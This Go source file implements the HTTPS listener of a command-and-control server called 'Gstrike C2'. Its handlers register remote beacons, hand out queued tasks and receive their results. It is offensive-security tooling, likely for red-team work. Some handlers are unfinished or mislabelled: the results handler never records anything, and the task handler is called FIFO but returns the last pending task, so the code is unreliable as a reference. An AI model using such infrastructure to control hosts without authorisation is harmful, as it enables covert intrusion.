package comms

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"gstrike/pkg/core"
	"gstrike/pkg/util"
	"net/http"
	"strconv"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/mux"
)

var Listeners []HttpsListener

type HttpsListener struct {
	ID        string    // Unique identifier (e.g., UUID)
	Port      int       // Port number
	CreatedAt time.Time // When the listener was created
	StartedAt time.Time // When the listener was started (may be zero if not started yet)
	Status    string    // Current status: "stopped", "running", "error", etc.
	CertFile  string    // Path to TLS cert file (if TLS enabled)
	KeyFile   string    // Path to TLS key file (if TLS enabled)
	Server    *http.Server
}

func NewHttps(port int) HttpsListener {
	listener := HttpsListener{
		ID:        uuid.NewString(),
		Port:      port,
		CreatedAt: time.Now(),
		CertFile:  "build/config/certs/server.crt",
		KeyFile:   "build/config/certs/server.key",
	}
	listener.Status = "stopped"
	Listeners = append(Listeners, listener)
	return Listeners[len(Listeners)-1]
}

func (l *HttpsListener) Start() {
	r := mux.NewRouter()
	beaconApi := r.PathPrefix("/").Subrouter()

	beaconApi.HandleFunc("/register", RegisterBeaconHandler).Methods("POST")
	beaconApi.HandleFunc("/tasks/{beaconId}", GetTasksHandler).Methods("GET")
	beaconApi.HandleFunc("/results/{beaconId}", PostResultsHandler).Methods("POST")

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}
	l.Server = &http.Server{
		Addr:      ":" + strconv.Itoa(l.Port),
		Handler:   r,
		TLSConfig: tlsConfig,
	}

	l.StartedAt = time.Now()
	l.Status = "running"
	fmt.Printf("\n%s [%s] Gstrike C2 Https server listening on https://localhost:%d\n", util.PrintGood, l.StartedAt, l.Port)
	err := l.Server.ListenAndServeTLS(l.CertFile, l.KeyFile)
	if err != nil {
		fmt.Printf("%s Error while starting listener: %v\n", util.PrintBad, err)
		return
	}
}

func (l *HttpsListener) Stop() error {
	var ctx context.Context
	var err error
	if l.Status == "running" {
		l.Status = "stopped"
		err = l.Server.Shutdown(ctx)
	}
	return err
}

// Registers the beacon, hands a unique UUID to identify them, received some critical info about the beacons env
func RegisterBeaconHandler(w http.ResponseWriter, r *http.Request) {
	// Parse
	var beacon core.Beacon
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	// Server side info
	beacon.ID = uuid.New().String()
	beacon.FirstSeen = time.Now()
	beacon.LastSeen = time.Now()
	beacon.ExternalIP = r.RemoteAddr

	// push to array
	core.Beacons = append(core.Beacons, beacon)

	// Send back full json of Beacon type, most importantly uuid
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beacon)
}

// Parses & updates "Tasks", Prints out received command result from beacon
func PostResultsHandler(w http.ResponseWriter, r *http.Request) {
	// Parse
	var TaskRes core.Task
	if err := json.NewDecoder(r.Body).Decode(&TaskRes); err != nil {
		fmt.Printf("%s Json decode error: %v\n", util.PrintBad, err)
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}
	// Update task
}

// Sends Next Waiting Task to Agent from oldest -> latest FIFO
func GetTasksHandler(w http.ResponseWriter, r *http.Request) {
	beaconId := mux.Vars(r)["beaconId"]
	var beaconTask core.Task

	for i := 0; i < len(core.Tasks); i++ {
		if core.Tasks[i].BeaconID == beaconId && core.Tasks[i].Status == "pending" {
			beaconTask = core.Tasks[i]
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(beaconTask)
}
